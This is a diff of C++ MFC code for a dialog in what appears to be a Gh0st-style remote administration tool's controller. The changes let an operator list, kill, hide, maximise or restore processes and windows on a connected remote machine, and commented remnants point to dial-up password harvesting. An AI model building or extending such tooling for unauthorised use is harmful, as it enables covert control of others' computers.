@@ -15,9 +15,13 @@ IMPLEMENT_DYNAMIC(CSystemDlg, CDialog)
 CSystemDlg::CSystemDlg(CWnd* pParent /*=nullptr*/, CIOCPServer* pIOCPServer, ClientContext *pContext)
 	: CDialog(IDD_SYSTEM, pParent)
 {
-	m_iocpServer = pIOCPServer;        //就是一个赋值没什么特别的我们到oninitdialog
+	m_iocpServer = pIOCPServer;        //参数赋值给成员变量
 	m_pContext = pContext;
 	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));
+	//这里判断是窗口管理还是进程管理因为进程管理的数据头是TOKEN_PSLIST
+	//窗口管理的数据头TOKEN_WSLIST  我们可以用这两个数据头来区分
+	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(0));
+	m_caseSyetemIs = lpBuffer[0];
 }
 
 CSystemDlg::~CSystemDlg()
@@ -27,19 +31,22 @@ CSystemDlg::~CSystemDlg()
 void CSystemDlg::DoDataExchange(CDataExchange* pDX)
 {
 	CDialog::DoDataExchange(pDX);
-	DDX_Control(pDX, IDC_TAB, m_tab);
-	DDX_Control(pDX, IDC_LIST_WINDOWS, m_list_windows);
-	DDX_Control(pDX, IDC_LIST_PROCESS, m_list_process);
+	DDX_Control(pDX, IDC_LIST_PROCESS_OR_WINDOW, m_list_process_or_windows);
 }
 
 
 BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
 	ON_WM_SIZE()
 	ON_WM_CLOSE()
-	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, &CSystemDlg::OnTcnSelchangeTab)
 	ON_COMMAND(IDM_KILLPROCESS, &CSystemDlg::OnKillprocess)
 	ON_COMMAND(IDM_REFRESHPSLIST, &CSystemDlg::OnRefreshpslist)
-	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, &CSystemDlg::OnNMRClickListProcess)
+	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS_OR_WINDOW, &CSystemDlg::OnNMRClickListProcess)
+	ON_COMMAND(ID_WINDOW_CLOST, &CSystemDlg::OnWindowClost)
+	ON_COMMAND(ID_WINDOW_HIDE, &CSystemDlg::OnWindowHide)
+	ON_COMMAND(ID_WINDOW_MAX, &CSystemDlg::OnWindowMax)
+	ON_COMMAND(ID_WINDOW_MIN, &CSystemDlg::OnWindowMin)
+	ON_COMMAND(ID_WINDOW_RETURN, &CSystemDlg::OnWindowReturn)
+	ON_COMMAND(ID_WINDOW_REFLUSH, &CSystemDlg::OnWindowReflush)
 END_MESSAGE_MAP()
 
 
@@ -47,24 +54,20 @@ END_MESSAGE_MAP()
 
 void CSystemDlg::AdjustList(void)
 {
-	if (m_list_process.m_hWnd == NULL)
+	if (m_list_process_or_windows.m_hWnd == NULL)
 	{
 		return;
 	}
-	if (m_list_windows.m_hWnd == NULL)
-	{
-		return;
-		RECT	rectClient;
-		RECT	rectList;
-		GetClientRect(&rectClient);
-		rectList.left = 0;
-		rectList.top = 29;
-		rectList.right = rectClient.right;
-		rectList.bottom = rectClient.bottom;
+	RECT	rectClient;
+	RECT	rectList;
+	GetClientRect(&rectClient);
+	rectList.left = 0;
+	rectList.top = 0;
+	rectList.right = rectClient.right;
+	rectList.bottom = rectClient.bottom;
 
-		m_list_process.MoveWindow(&rectList);
-		m_list_windows.MoveWindow(&rectList);
-	}
+	m_list_process_or_windows.MoveWindow(&rectList);
+	
 }
 
 
@@ -84,33 +87,6 @@ void CSystemDlg::OnClose()
 }
 
 
-void CSystemDlg::OnTcnSelchangeTab(NMHDR *pNMHDR, LRESULT *pResult)
-{
-	// TODO: 在此添加控件通知处理程序代码
-	ShowSelectWindow();
-	*pResult = 0;
-}
-
-
-
-void CSystemDlg::ShowSelectWindow(void)
-{
-	switch (m_tab.GetCurSel())
-	{
-	case 0:
-		m_list_windows.ShowWindow(SW_HIDE);
-		m_list_process.ShowWindow(SW_SHOW);
-		if (m_list_process.GetItemCount() == 0)
-			GetProcessList();
-		break;
-	case 1:
-		m_list_windows.ShowWindow(SW_SHOW);
-		m_list_process.ShowWindow(SW_HIDE);
-		if (m_list_windows.GetItemCount() == 0)
-			//GetWindowsList();
-			break;
-	}
-}
 
 
 void CSystemDlg::GetProcessList(void)
@@ -139,23 +115,23 @@ BOOL CSystemDlg::OnInitDialog()
 	SetWindowText(str);//设置对话框标题
 
 
-	m_tab.InsertItem(0, "进程管理");    //为tab设置标题
-	m_tab.InsertItem(1, "窗口管理");
-	m_tab.InsertItem(2, "拨号密码");
-
-	m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //初始化进程的列表
-	m_list_process.InsertColumn(0, "映像名称", LVCFMT_LEFT, 100);
-	m_list_process.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
-	m_list_process.InsertColumn(2, "程序路径", LVCFMT_LEFT, 400);
-
-	m_list_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //初始化 窗口管理的列表
-	m_list_windows.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
-	m_list_windows.InsertColumn(1, "窗口名称", LVCFMT_LEFT, 300);
-
-
+	if (m_caseSyetemIs == TOKEN_PSLIST)      //进程管理初始化列表
+	{
+		m_list_process_or_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //初始化进程的列表
+		m_list_process_or_windows.InsertColumn(0, "映像名称", LVCFMT_LEFT, 100);
+		m_list_process_or_windows.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
+		m_list_process_or_windows.InsertColumn(2, "程序路径", LVCFMT_LEFT, 400);
+		ShowProcessList();   //由于第一个发送来的消息后面紧跟着进程的数据所以把数据显示到列表当中
+	}
+	else if (m_caseSyetemIs == TOKEN_WSLIST)//窗口管理初始化列表
+	{
+		m_list_process_or_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //初始化 窗口管理的列表
+		m_list_process_or_windows.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
+		m_list_process_or_windows.InsertColumn(1, "窗口名称", LVCFMT_LEFT, 300);
+		m_list_process_or_windows.InsertColumn(2, "窗口状态", LVCFMT_LEFT, 300);
+		ShowWindowsList();
+	}
 	AdjustList();       //各个列表的大小
-	ShowProcessList();   //由于第一个发送来的消息后面紧跟着进程的数据所以把数据显示到列表当中
-	ShowSelectWindow();   //显示列表
 	return TRUE;  // return TRUE unless you set the focus to a control
 	// 异常: OCX 属性页应返回 FALSE
 }
@@ -168,7 +144,7 @@ void CSystemDlg::ShowProcessList(void)
 	char	*strProcessName;
 	DWORD	dwOffset = 0;
 	CString str;
-	m_list_process.DeleteAllItems();
+	m_list_process_or_windows.DeleteAllItems();
 	//遍历发送来的每一个字符 数据结构 Id+进程名+0+完整名+0
 	int i;
 	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
@@ -178,12 +154,12 @@ void CSystemDlg::ShowProcessList(void)
 		strProcessName = strExeFile + lstrlen(strExeFile) + 1;  //完整名就是进程名之后的
 		//数据结构构建巧妙
 
-		m_list_process.InsertItem(i, strExeFile);       //将得到的数据加入到列表当中
+		m_list_process_or_windows.InsertItem(i, strExeFile);       //将得到的数据加入到列表当中
 		str.Format("%5u", *lpPID);
-		m_list_process.SetItemText(i, 1, str);
-		m_list_process.SetItemText(i, 2, strProcessName);
+		m_list_process_or_windows.SetItemText(i, 1, str);
+		m_list_process_or_windows.SetItemText(i, 2, strProcessName);
 		// ItemData 为进程ID
-		m_list_process.SetItemData(i, *lpPID);
+		m_list_process_or_windows.SetItemData(i, *lpPID);
 
 		dwOffset += sizeof(DWORD) + lstrlen(strExeFile) + lstrlen(strProcessName) + 2;   //跳过这个数据结构 进入下一个循环
 	}
@@ -193,7 +169,7 @@ void CSystemDlg::ShowProcessList(void)
 	lvc.mask = LVCF_TEXT;
 	lvc.pszText = str.GetBuffer(0);
 	lvc.cchTextMax = str.GetLength();
-	m_list_process.SetColumn(2, &lvc); //在列表中显示有多少个进程
+	m_list_process_or_windows.SetColumn(2, &lvc); //在列表中显示有多少个进程
 }
 
 
@@ -201,10 +177,10 @@ void CSystemDlg::OnKillprocess()
 {
 	// TODO: 在此添加命令处理程序代码
 	CListCtrl	*pListCtrl = NULL;
-	if (m_list_process.IsWindowVisible())
-		pListCtrl = &m_list_process;
-	else if (m_list_windows.IsWindowVisible())
-		pListCtrl = &m_list_windows;
+	if (m_list_process_or_windows.IsWindowVisible())
+		pListCtrl = &m_list_process_or_windows;
+	else if (m_list_process_or_windows.IsWindowVisible())
+		pListCtrl = &m_list_process_or_windows;
 	else
 		return;
 
@@ -244,11 +220,57 @@ void CSystemDlg::OnKillprocess()
 	LocalFree(lpBuffer);
 }
 
+void CSystemDlg::ShowWindowsList(void)
+{
+	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+	DWORD	dwOffset = 0;
+	char	*lpTitle = NULL;
+	//m_list_process.DeleteAllItems();
+	bool isDel = false;
+	do
+	{
+		isDel = false;
+		for (int j = 0; j < m_list_process_or_windows.GetItemCount(); j++)
+		{
+			CString temp = m_list_process_or_windows.GetItemText(j, 2);
+			CString restr = "隐藏";
+			if (temp != restr)
+			{
+				m_list_process_or_windows.DeleteItem(j);
+				isDel = true;
+				break;
+			}
+		}
+
+	} while (isDel);
+	CString	str;
+	int i;
+	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
+	{
+		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
+		lpTitle = (char *)lpBuffer + dwOffset + sizeof(DWORD);
+		str.Format("%5u", *lpPID);
+		m_list_process_or_windows.InsertItem(i, str);
+		m_list_process_or_windows.SetItemText(i, 1, lpTitle);
+		m_list_process_or_windows.SetItemText(i, 2, "显示"); //(d) 将窗口状态显示为 "显示"
+		// ItemData 为窗口句柄
+		m_list_process_or_windows.SetItemData(i, *lpPID);  //(d)
+		dwOffset += sizeof(DWORD) + lstrlen(lpTitle) + 1;
+	}
+	str.Format("窗口名称 / %d", i);
+	LVCOLUMN lvc;
+	lvc.mask = LVCF_TEXT;
+	lvc.pszText = str.GetBuffer(0);
+	lvc.cchTextMax = str.GetLength();
+	m_list_process_or_windows.SetColumn(1, &lvc);
+
+}
+
 
 void CSystemDlg::OnRefreshpslist()
 {
 	// TODO: 在此添加命令处理程序代码
-	if (m_list_process.IsWindowVisible())
+	if (m_list_process_or_windows.IsWindowVisible())
 		GetProcessList();
 	//if (m_list_windows.IsWindowVisible())
 		//GetWindowsList();
@@ -260,7 +282,14 @@ void CSystemDlg::OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult)
 	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
 	// TODO: 在此添加控件通知处理程序代码
 	CMenu	popup;
-	popup.LoadMenu(IDR_PSLIST);
+	if (m_caseSyetemIs == TOKEN_PSLIST)      //进程管理初始化列表
+	{
+		popup.LoadMenu(IDR_PSLIST);
+	}
+	else if (m_caseSyetemIs == TOKEN_WSLIST)
+	{
+		popup.LoadMenu(IDR_WINDOW_LIST);
+	}
 	CMenu*	pM = popup.GetSubMenu(0);
 	CPoint	p;
 	GetCursorPos(&p);
@@ -277,9 +306,9 @@ void CSystemDlg::OnReceiveComplete(void)
 	case TOKEN_PSLIST:
 		ShowProcessList();
 		break;
-		//case TOKEN_WSLIST:
-			//ShowWindowsList();
-			//break;
+	case TOKEN_WSLIST:
+		ShowWindowsList();
+		break;
 		//case TOKEN_DIALUPASS:
 			//ShowDialupassList();
 			//break;
@@ -289,3 +318,130 @@ void CSystemDlg::OnReceiveComplete(void)
 	}
 }
 
+
+
+void CSystemDlg::OnWindowClost()
+{
+	// TODO: 在此添加命令处理程序代码
+	BYTE lpMsgBuf[20];
+	CListCtrl	*pListCtrl = NULL;
+	pListCtrl = &m_list_process_or_windows;
+
+	int	nItem = pListCtrl->GetSelectionMark();
+	if (nItem >= 0)
+	{
+		ZeroMemory(lpMsgBuf, 20);
+		lpMsgBuf[0] = COMMAND_WINDOW_CLOSE;      //注意这个就是我们的数据头
+		DWORD hwnd = pListCtrl->GetItemData(nItem); //得到窗口的句柄一同发送
+		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
+		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
+
+	}
+}
+
+
+void CSystemDlg::OnWindowHide()
+{
+	// TODO: 在此添加命令处理程序代码
+	BYTE lpMsgBuf[20];
+	CListCtrl	*pListCtrl = NULL;
+	pListCtrl = &m_list_process_or_windows;
+
+	int	nItem = pListCtrl->GetSelectionMark();
+	if (nItem >= 0)
+	{
+		ZeroMemory(lpMsgBuf, 20);
+		lpMsgBuf[0] = COMMAND_WINDOW_TEST;       //窗口处理数据头
+		DWORD hwnd = pListCtrl->GetItemData(nItem);  //得到窗口的句柄一同发送
+		pListCtrl->SetItemText(nItem, 2, "隐藏");  //注意这时将列表中的显示状态为"隐藏"
+		//这样在删除列表条目时就不删除该项了 如果删除该项窗口句柄会丢失 就永远也不能显示了
+		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));  //得到窗口的句柄一同发送
+		DWORD dHow = SW_HIDE;               //窗口处理参数 0
+		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
+		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
+	}
+}
+
+void CSystemDlg::OnWindowMax()
+{
+	// TODO: 在此添加命令处理程序代码
+	BYTE lpMsgBuf[20];
+	CListCtrl	*pListCtrl = NULL;
+	pListCtrl = &m_list_process_or_windows;
+
+	int	nItem = pListCtrl->GetSelectionMark();
+	if (nItem >= 0)
+	{
+		ZeroMemory(lpMsgBuf, 20);
+		lpMsgBuf[0] = COMMAND_WINDOW_TEST;     //同上
+		DWORD hwnd = pListCtrl->GetItemData(nItem);  //同上
+		pListCtrl->SetItemText(nItem, 2, "显示");   //将状态改为显示
+		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
+		DWORD dHow = SW_MAXIMIZE;     //同上
+		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
+		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
+
+	}
+	// TODO: 在此添加命令处理程序代码
+}
+
+
+void CSystemDlg::OnWindowMin()
+{
+	// TODO: 在此添加命令处理程序代码
+	// TODO: 在此添加命令处理程序代码
+	BYTE lpMsgBuf[20];
+	CListCtrl	*pListCtrl = NULL;
+	pListCtrl = &m_list_process_or_windows;
+
+	int	nItem = pListCtrl->GetSelectionMark();
+	if (nItem >= 0)
+	{
+		ZeroMemory(lpMsgBuf, 20);
+		lpMsgBuf[0] = COMMAND_WINDOW_TEST;
+		DWORD hwnd = pListCtrl->GetItemData(nItem);
+		pListCtrl->SetItemText(nItem, 2, "显示");
+		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
+		DWORD dHow = SW_MINIMIZE;
+		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
+		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
+
+	}
+}
+
+
+void CSystemDlg::OnWindowReturn()
+{
+	// TODO: 在此添加命令处理程序代码
+	BYTE lpMsgBuf[20];
+	CListCtrl	*pListCtrl = NULL;
+	pListCtrl = &m_list_process_or_windows;
+
+	int	nItem = pListCtrl->GetSelectionMark();
+	if (nItem >= 0)
+	{
+		ZeroMemory(lpMsgBuf, 20);
+		lpMsgBuf[0] = COMMAND_WINDOW_TEST;
+		DWORD hwnd = pListCtrl->GetItemData(nItem);
+		pListCtrl->SetItemText(nItem, 2, "显示");
+		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
+		DWORD dHow = SW_RESTORE;
+		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
+		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
+
+	}
+}
+
+
+void CSystemDlg::OnWindowReflush()
+{
+	// TODO: 在此添加命令处理程序代码
+	GetWindowsList();
+}
+
+
+void CSystemDlg::GetWindowsList(void)
+{
+	BYTE bToken = COMMAND_WSLIST;
+	m_iocpServer->Send(m_pContext, &bToken, 1);
+}
